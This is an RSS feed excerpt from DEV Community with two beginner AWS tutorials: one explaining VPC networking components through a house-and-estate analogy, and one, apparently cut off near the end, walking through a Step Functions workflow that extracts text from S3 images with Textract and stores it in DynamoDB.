<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>AWS VPC: What you need to understand</title>
      <author>Sulaiman Olubiyi </author>
      <pubDate>Sun, 23 Jan 2022 18:47:01 +0000</pubDate>
      <link>https://dev.to/damdev95/aws-vpc-what-you-need-to-understand-2dbk</link>
      <guid>https://dev.to/damdev95/aws-vpc-what-you-need-to-understand-2dbk</guid>
      <description>&lt;p&gt;Have you been wondering how AWS defines the backbone of its networking service?&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--rGk4VL4T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lc2249q8mnsjcdtbtqka.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--rGk4VL4T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lc2249q8mnsjcdtbtqka.png" alt="AWS VPC diagram" width="598" height="361"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Well, this is all thanks to VPC Virtual Private Cloud, a virtual network within the AWS cloud, and it comprises the following: security groups, network access control list (NACl), subnet, route tables, internet gateway and NAT gateway.&lt;br&gt;
Using an analogy, AWS cloud can be described as an estate which contains several houses.&lt;br&gt;
A VPC is an individual house in that estate and you can place your properties in different positions in your house. Some properties may be placed in the living room while others in the bedroom. When expecting a visitor, that is, traffic from the internet. This can refer to the isolated logical network in the AWS cloud where you provision your resources such as application and database servers. The concept of VPC components are explained thus:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--bhIR1Lw0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3wmrzasxc5kmau1jren9.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bhIR1Lw0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3wmrzasxc5kmau1jren9.jpg" alt="Typical Analogy of VPC in form of estate" width="880" height="466"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Internet Gateway: This is likened to the telephone in your house and it is the only way for anyone that wants to visit you to reach you. If your telephone line is off, nobody can reach your house and only the people within your house can talk to each other.
In AWS, this refers to the default route to the internet which enables your resources in the VPC to communicate with the internet.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JjBjXePP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/56rm77btdgl2t8sy2bpz.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JjBjXePP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/56rm77btdgl2t8sy2bpz.jpg" alt="Image showing the estate and the visitor" width="880" height="837"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Subnets: These are logical segmentation of your resources, they can be likened to the properties in your house. The properties placed in the living room are public subnets, all your visitors can see them such as television, stereo system etc. &lt;br&gt;
In AWS, Web/Application servers are deployed in the public subnets, external users can have access to them and are reachable on the internet.&lt;br&gt;
The properties placed in your bedroom are private subnets, they are accessible within your house, that is, only your family members have access to them.&lt;br&gt;
In AWS, database servers are mostly placed in the private subnets in VPC because they are only accessible within your VPC network.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;NAT Gateway: By default, only people staying in the living room can meet the visitors, perhaps you are in the bedroom and you want to meet the visitor, you can use your mobile phone to talk to them, but you would be the one to make a call request.&lt;br&gt;
In AWS, this allows resources deployed in the private subnets to have access to the internet, and is especially used for upgrade and software patches for database servers or to enhance the security level of the system.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--3anVmdRC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8a7pxd3aiawpvppl0txs.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--3anVmdRC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8a7pxd3aiawpvppl0txs.jpg" alt="Security measure towards the house" width="766" height="548"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Network Access Control List: These are the security guards guarding your home, they will check the visitor,to either grant access to the building or not.&lt;br&gt;
In AWS, this serves as a security measure at the subnet level for your VPC network to deny or allow inbound and outbound traffic. At default, it allows both inbound and outbound traffic.&lt;br&gt;
Inbound traffic: User's request entering the VPC &lt;br&gt;
Outbound traffic: User's response leaving the VPC&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Security Group: You have an electronic door which checks the visitors before they can come in. If they have an appointment or invite, they will be granted access to your living room and welcomed to your home, and when the visitor is departing, he wouldn’t be subjected to another check (stateful).&lt;br&gt;
In AWS, this is a security measure at the instance level, it only allows traffic and it is stateful which means once the traffic is allowed in, automatically the traffic will be permitted out.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope you understand the basics of VPC, your comments are welcome&lt;br&gt;
Cheers 😊&lt;/p&gt;

</description>
      <category>aws</category>
      <category>cloud</category>
      <category>devops</category>
    </item>
    <item>
      <title>Step Functions for making your text based images searchable</title>
      <author>Jones Zachariah Noel</author>
      <pubDate>Sun, 23 Jan 2022 18:21:45 +0000</pubDate>
      <link>https://dev.to/aws-builders/step-functions-for-making-your-text-based-images-searchable-334</link>
      <guid>https://dev.to/aws-builders/step-functions-for-making-your-text-based-images-searchable-334</guid>
      <description>&lt;p&gt;&lt;a href="https://aws.amazon.com/step-functions/"&gt;AWS Step Functions&lt;/a&gt; helps with workflow orchestration with low-code and visual editor available on the AWS web-console. Step Functions had an important announcement which allowed 200+ AWS Services to be integrated with AWS SDK, you can read about the &lt;a href="https://aws.amazon.com/about-aws/whats-new/2021/09/aws-step-functions-200-aws-sdk-integration/"&gt;announcement&lt;/a&gt;.&lt;br&gt;
In this blog-post we will look into two such SDK integrations with Step Functions - &lt;a href="https://aws.amazon.com/textract/"&gt;&lt;strong&gt;Amazon Textract&lt;/strong&gt;&lt;/a&gt; and &lt;a href="https://aws.amazon.com/dynamodb/"&gt;&lt;strong&gt;Amazon DynamoDB&lt;/strong&gt;&lt;/a&gt;.&lt;br&gt;
My previous blog posts, gives an introduction to Textract.&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag__link"&gt;
  &lt;a href="/aws-builders" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__org__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5zuWf912--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--Z-NQNKRG--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/organization/profile_image/2794/88da75b6-aadd-4ea1-8083-ae2dfca8be94.png" alt="AWS Community Builders " width="150" height="150"&gt;
      &lt;div class="ltag__link__user__pic"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kxOxwlY1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s---xOiJQij--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/615180/fc1ebf14-25d7-4f09-ae53-807a0a859f9d.png" alt="" width="150" height="150"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/aws-builders/amazon-textract-with-expense-analyzing-516b" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;Amazon Textract with expense analyzing&lt;/h2&gt;
      &lt;h3&gt;Jones Zachariah Noel for AWS Community Builders  ・ Oct 17 '21 ・ 5 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#textract&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#aws&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#machinelearning&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#tutorial&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;
&lt;br&gt;
To understand Step Functions' &lt;em&gt;Workflow Studio&lt;/em&gt;, you can check out  Sebastian Bille's (@tastefulelk) blog-post&lt;br&gt;
&lt;div class="ltag__link"&gt;
  &lt;a href="/aws-builders" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__org__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5zuWf912--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--Z-NQNKRG--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/organization/profile_image/2794/88da75b6-aadd-4ea1-8083-ae2dfca8be94.png" alt="AWS Community Builders " width="150" height="150"&gt;
      &lt;div class="ltag__link__user__pic"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kMOJkW1N--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s---0KMh0T7--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/269325/505c1a64-b1d1-4a2f-a52a-fcc2226c2f1d.jpg" alt="" width="150" height="150"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/aws-builders/step-functions-workflow-studio-with-serverless-framework-4j8m" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;Step Functions Workflow Studio with Serverless Framework&lt;/h2&gt;
      &lt;h3&gt;Sebastian Bille for AWS Community Builders  ・ Aug 11 '21 ・ 3 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#serverless&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#aws&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#tutorial&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#cloud&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;


&lt;h3&gt;
  &lt;a href="#key-takeaways-from-the-blog"&gt;
  &lt;/a&gt;
  Key take-aways from the blog
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#textract-sdk"&gt;Step Functions with Textract SDK integrations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#dynamodb-sdk"&gt;Step Functions with DynamoDB SDK integrations&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#workflow-overview"&gt;
  &lt;/a&gt;
  Workflow overview
&lt;/h3&gt;

&lt;p&gt;The workflow is simple and could be invoked from the web console with parameters - &lt;code&gt;DocumentName&lt;/code&gt; and &lt;code&gt;BucketName&lt;/code&gt; which are also the parameters used for &lt;em&gt;Textract&lt;/em&gt;. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---HPGQmWx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ppqj9kbu1p2syp5lnrkc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---HPGQmWx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ppqj9kbu1p2syp5lnrkc.png" alt="Workflow details" width="782" height="682"&gt;&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;"Comment"&lt;/span&gt;: &lt;span class="s2"&gt;"Step Functions for making your text based images searchable which uses Textract and DynamoDB SDK intergrations"&lt;/span&gt;,
  &lt;span class="s2"&gt;"StartAt"&lt;/span&gt;: &lt;span class="s2"&gt;"AnalyzeDocument"&lt;/span&gt;,
  &lt;span class="s2"&gt;"States"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;"AnalyzeDocument"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
      &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Task"&lt;/span&gt;,
      &lt;span class="s2"&gt;"Parameters"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;"Document"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
          &lt;span class="s2"&gt;"S3Object"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;"Bucket"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;BucketName"&lt;/span&gt;,
            &lt;span class="s2"&gt;"Name.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;DocumentName"&lt;/span&gt;
          &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;,
        &lt;span class="s2"&gt;"FeatureTypes"&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
          &lt;span class="s2"&gt;"FORMS"&lt;/span&gt;
        &lt;span class="o"&gt;]&lt;/span&gt;
      &lt;span class="o"&gt;}&lt;/span&gt;,
      &lt;span class="s2"&gt;"Resource"&lt;/span&gt;: &lt;span class="s2"&gt;"arn:aws:states:::aws-sdk:textract:analyzeDocument"&lt;/span&gt;,
      &lt;span class="s2"&gt;"ResultPath"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;params.TextractResult"&lt;/span&gt;,
      &lt;span class="s2"&gt;"Next"&lt;/span&gt;: &lt;span class="s2"&gt;"ProcessEachText"&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s2"&gt;"ProcessEachText"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
      &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Map"&lt;/span&gt;,
      &lt;span class="s2"&gt;"Parameters"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;"TextIndex.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="s2"&gt;.Map.Item.Index"&lt;/span&gt;,
        &lt;span class="s2"&gt;"TextJSON.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="s2"&gt;.Map.Item.Value"&lt;/span&gt;,
        &lt;span class="s2"&gt;"DocumentName.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;DocumentName"&lt;/span&gt;
      &lt;span class="o"&gt;}&lt;/span&gt;,
      &lt;span class="s2"&gt;"Iterator"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;"StartAt"&lt;/span&gt;: &lt;span class="s2"&gt;"Choice"&lt;/span&gt;,
        &lt;span class="s2"&gt;"States"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
          &lt;span class="s2"&gt;"Choice"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Choice"&lt;/span&gt;,
            &lt;span class="s2"&gt;"Choices"&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
              &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s2"&gt;"Or"&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
                  &lt;span class="o"&gt;{&lt;/span&gt;
                    &lt;span class="s2"&gt;"Variable"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;TextJSON.BlockType"&lt;/span&gt;,
                    &lt;span class="s2"&gt;"StringEquals"&lt;/span&gt;: &lt;span class="s2"&gt;"LINE"&lt;/span&gt;
                  &lt;span class="o"&gt;}&lt;/span&gt;,
                  &lt;span class="o"&gt;{&lt;/span&gt;
                    &lt;span class="s2"&gt;"Variable"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;TextJSON.BlockType"&lt;/span&gt;,
                    &lt;span class="s2"&gt;"StringEquals"&lt;/span&gt;: &lt;span class="s2"&gt;"WORD"&lt;/span&gt;
                  &lt;span class="o"&gt;}&lt;/span&gt;
                &lt;span class="o"&gt;]&lt;/span&gt;,
                &lt;span class="s2"&gt;"Next"&lt;/span&gt;: &lt;span class="s2"&gt;"DynamoDB PutItem"&lt;/span&gt;
              &lt;span class="o"&gt;}&lt;/span&gt;
            &lt;span class="o"&gt;]&lt;/span&gt;,
            &lt;span class="s2"&gt;"Default"&lt;/span&gt;: &lt;span class="s2"&gt;"Skip"&lt;/span&gt;
          &lt;span class="o"&gt;}&lt;/span&gt;,
          &lt;span class="s2"&gt;"DynamoDB PutItem"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Task"&lt;/span&gt;,
            &lt;span class="s2"&gt;"Resource"&lt;/span&gt;: &lt;span class="s2"&gt;"arn:aws:states:::aws-sdk:dynamodb:putItem"&lt;/span&gt;,
            &lt;span class="s2"&gt;"Parameters"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
              &lt;span class="s2"&gt;"TableName"&lt;/span&gt;: &lt;span class="s2"&gt;"TextractKeywordsDB"&lt;/span&gt;,
              &lt;span class="s2"&gt;"Item"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s2"&gt;"pk"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
                  &lt;span class="s2"&gt;"S.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;DocumentName"&lt;/span&gt;
                &lt;span class="o"&gt;}&lt;/span&gt;,
                &lt;span class="s2"&gt;"sk"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
                  &lt;span class="s2"&gt;"S.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;TextJSON.Text"&lt;/span&gt;
                &lt;span class="o"&gt;}&lt;/span&gt;
              &lt;span class="o"&gt;}&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;,
            &lt;span class="s2"&gt;"End"&lt;/span&gt;: &lt;span class="nb"&gt;true&lt;/span&gt;
          &lt;span class="o"&gt;}&lt;/span&gt;,
          &lt;span class="s2"&gt;"Skip"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Pass"&lt;/span&gt;,
            &lt;span class="s2"&gt;"End"&lt;/span&gt;: &lt;span class="nb"&gt;true&lt;/span&gt;
          &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
      &lt;span class="o"&gt;}&lt;/span&gt;,
      &lt;span class="s2"&gt;"ItemsPath"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;params.TextractResult.Blocks"&lt;/span&gt;,
      &lt;span class="s2"&gt;"End"&lt;/span&gt;: &lt;span class="nb"&gt;true&lt;/span&gt;,
      &lt;span class="s2"&gt;"ResultPath"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;TranslatedText"&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#amazon-textract-analyzedocument"&gt;
  &lt;/a&gt;
  Amazon Textract : AnalyzeDocument
&lt;/h4&gt;

&lt;p&gt;In this step, we would be extracting all the textual data from a image stored on S3 bucket in the same account. &lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#map-state-proceseachtext"&gt;
  &lt;/a&gt;
  Map State : ProcesEachText
&lt;/h4&gt;

&lt;p&gt;We would have to loop with the &lt;code&gt;Blocks&lt;/code&gt; which is returned from Textract as a response. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--EBaPNx_3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mj36iu9eu41omvvz0wj0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--EBaPNx_3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mj36iu9eu41omvvz0wj0.png" alt="Map" width="285" height="100"&gt;&lt;/a&gt;&lt;br&gt;
The inputs from previous step to Maps is defined with &lt;code&gt;parameters&lt;/code&gt;.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#choice"&gt;
  &lt;/a&gt;
  Choice
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8filyp4E--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8stbradhklsut3kyqne0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8filyp4E--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8stbradhklsut3kyqne0.png" alt="choice" width="880" height="193"&gt;&lt;/a&gt;&lt;br&gt;
For each item in &lt;code&gt;Block&lt;/code&gt;, we will validate if that item has &lt;code&gt;BlockType&lt;/code&gt; value either as &lt;em&gt;LINE&lt;/em&gt; or &lt;em&gt;WORD&lt;/em&gt;. If the condition matches, it proceeds to the DynamoDB step else it will just pass the item.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#dynamodb-putitem"&gt;
  &lt;/a&gt;
  DynamoDB : PutItem
&lt;/h4&gt;

&lt;p&gt;For the items which have &lt;code&gt;BlockType&lt;/code&gt; value either as &lt;em&gt;LINE&lt;/em&gt; or &lt;em&gt;WORD&lt;/em&gt;, they are the one which have textual data so we will use the &lt;code&gt;Text&lt;/code&gt; to write into DynamoDB.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-functions-with-textract-sdk-integrations"&gt;
  &lt;/a&gt;
  Step Functions with Textract SDK integrations &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;With Textract SDK, we would be using &lt;code&gt;AnalyzeDocument&lt;/code&gt; SDK API to get the text from a image stored on S3 bucket. This API requires the &lt;code&gt;Document&lt;/code&gt; as input which has details such as &lt;code&gt;Bucket&lt;/code&gt; name and &lt;code&gt;Name&lt;/code&gt; stored on S3. Also it requires &lt;code&gt;FeatureTypes&lt;/code&gt; which commands Textract to extract text with a form base or table base. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7RK82rDN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wzqfu1zkfuh1ze7206qw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7RK82rDN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wzqfu1zkfuh1ze7206qw.png" alt="Textract" width="880" height="534"&gt;&lt;/a&gt;&lt;br&gt;
Workflow Studio, also shows the JSON definition of the step where the parameters from StepFunction input is mapped to SDK API input. The result path is also defined as it would be helpful for the Map State to look into the &lt;code&gt;Blocks&lt;/code&gt; list.&lt;br&gt;
Note : Step Functions role would create &lt;code&gt;textract:analyzedocument&lt;/code&gt; with &lt;code&gt;ALLOW&lt;/code&gt; action.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-functions-with-dynamodb-sdk-integrations"&gt;
  &lt;/a&gt;
  Step Functions with DynamoDB SDK integrations &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;DynamoDB SDK allows us to insert the records into DynamoDB table &lt;em&gt;TextractKeywordsDB&lt;/em&gt; with the &lt;code&gt;pk&lt;/code&gt; as the document key itself and &lt;code&gt;sk&lt;/code&gt; as the keyword which is detected from Textract.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vQG8eDME--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9aj7mwj6h5gx1msd27v6.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vQG8eDME--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9aj7mwj6h5gx1msd27v6.png" alt="DynamoDB" width="880" height="450"&gt;&lt;/a&gt;&lt;br&gt;
The JSON definition shows how the parameters are mapped with each item of the Map's iterator.&lt;br&gt;
Note : Step Functions role would create &lt;code&gt;dynamodb:putitem&lt;/code&gt; with &lt;code&gt;ALLOW&lt;/code&gt; action.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#executions-view"&gt;
  &lt;/a&gt;
  Executions view
&lt;/h3&gt;

&lt;p&gt;The &lt;strong&gt;AnalyzeDocument&lt;/strong&gt; step when the status changes to &lt;em&gt;Succeeded&lt;/em&gt;, it would show the step's output which is the JSON which Textract returns along with the metadata of each text detected.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OA3-wooj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hz42wrf0m1criw4h1hj2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OA3-wooj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hz42wrf0m1criw4h1hj2.png" alt="AnalyzeDocument" width="880" height="415"&gt;&lt;/a&gt;&lt;br&gt;
Whenever a map step is involved, along with the output of the complete Map execution, it also provides &lt;em&gt;Map iteration details&lt;/em&gt; which gives the overall details of how many iterations were completed, succeeded, failed, cancelled, in progress and pending.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Jg2W6-qm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1p7dkeelrsbc9xdcilzw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Jg2W6-qm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1p7dkeelrsbc9xdcilzw.png" alt="Map" width="880" height="356"&gt;&lt;/a&gt;&lt;br&gt;
We can also navigate through all the items of the map's iterator and view each execution details. For the one which &lt;em&gt;Choice&lt;/em&gt; condition is satisfied, DynamoDB PutItem step is invoked and also successfully completed.&lt;br&gt;
